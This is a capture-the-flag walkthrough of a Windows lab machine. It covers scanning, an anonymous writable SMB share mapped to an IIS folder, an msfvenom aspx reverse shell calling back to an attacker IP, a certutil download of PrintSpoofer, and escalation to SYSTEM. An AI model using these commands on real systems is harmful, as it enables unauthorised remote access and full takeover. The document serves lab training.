## IP: 10.10.18.222    

The IP was being provided,start the machine by exporting the IP.  

```
export IP='10.10.18.222'
```  

As usual perform a nmap scan to discover the services running.  

======================  
## NMAP RESULT:  

```
nmap -sCV $IP --open
```  

```
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-16T07:46:14+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-02-15T07:41:49
|_Not valid after:  2024-08-16T07:41:49
|_ssl-date: 2024-02-16T07:46:57+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-02-16T07:46:18
|_  start_date: 2024-02-16T07:42:37
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-15T23:46:16-08:00
```  

To discover all the running services:  

```
rustscan -a $IP
```  

```
Open 10.10.18.222:135
Open 10.10.18.222:139
Open 10.10.18.222:80
Open 10.10.18.222:445
Open 10.10.18.222:3389
Open 10.10.18.222:49663
Open 10.10.18.222:49670
Open 10.10.18.222:49667
```  

By enumerating further port 49663 came up to run http server and ports 49670,49667  

```
nmap -sCV  $IP --open -p 49663,49670,49667
```  

```
49663/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49667/tcp open  msrpc   Microsoft Windows RPC
49670/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So,from the nmap result we found the target to be a Windows Machine.  

## OS: Windows  

Next step will be to write the domain name in */etc/hosts* file  

======================  
## ENUMERATION:  

I started enumerating HTTP(80):  

Fuzzed the directory using *wfuzz* but nothing useful came out.  

Next Fuzzed the http server running on port *49663*  

and found one interesting directory *nt4wrksv*  

------  

Next I started to enumerate SMB(139,445) further.  


```
smbclient -L \\\\$IP\\
```  
with a '' password  

```
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      

```
![smb_null_share](https://github.com/Debang5hu/Debang5hu/assets/114200360/395dfdbb-5088-4bc8-8feb-28ce7abe28d0)  

*nt4wrksv* we have the permission to get into this share anonymously (i.e Without user and password)  

Even we can upload files using the anonymous session.  

we found a file "passwords.txt" but turned out to be *rabbit hole*.

Remember, we found an interesting directory named "nt4wrksv" in "http://relevant.thm/nt4wrksv"  

Next I check whether we can find the *passwords.txt* file in "nt4wrksv" directory and we were able to access the file.  

![smbshare_directory](https://github.com/Debang5hu/Debang5hu/assets/114200360/99ac8a45-ef73-45a7-9f0e-0a663fd18d51)  

## Getting a reverse shell  

Since it is a Windows server we will be uploading reverse shell of *aspx*  

Using msfvenom to create the payload  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.9.98 LPORT=53 -f aspx -o reverse.aspx
```  

Next upload the reverse.aspx by the anonymous SMB share  

![uploaded_payload](https://github.com/Debang5hu/Debang5hu/assets/114200360/dae0a9c1-76ba-486a-9d73-79e5d7819d76)  

Then start by starting a netcat server:  

```
rlwrap nc -lnvp 53
```

And get a payload by requesting "relevant.thm:49663/nt4wrksv/reverse.aspx" using browser else "curl" can be used to do the same.  

![revshell](https://github.com/Debang5hu/Debang5hu/assets/114200360/6cbd4f5d-4295-4725-9836-8a735bee87de)  

Then explore the file system to get the user flag.It could be found in (c:\Users\Bob\Desktop) then "type user.txt" to read the user flag!  

![userflag](https://github.com/Debang5hu/Debang5hu/assets/114200360/11267a9c-5e0d-468e-9f25-f4e7030252e4)  

## Priviledge Escallation:  

Start enumerating by checking the priviledges of the account.

```
whoami /priv
```  

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```  

We got *SeImpersonatePrivilege* enabled [i.e might be vulnerable to *Potato Attacks*]  

checking its systeminfo we found that it is vulnerable to https://github.com/dievus/printspoofer  

Then transfer the file to victim's device using *certutil*  

```
certutil.exe -urlcache -split -f http://10.17.9.98/PrintSpoofer.exe
```  

Then execute the file to escallate the priviledge  

```
PrintSpoofer.exe -i -c cmd
```  
![ntauthoritysystem](https://github.com/Debang5hu/Debang5hu/assets/114200360/6d72e4bc-b134-4e6d-ab6f-7902b7df1850)  

 
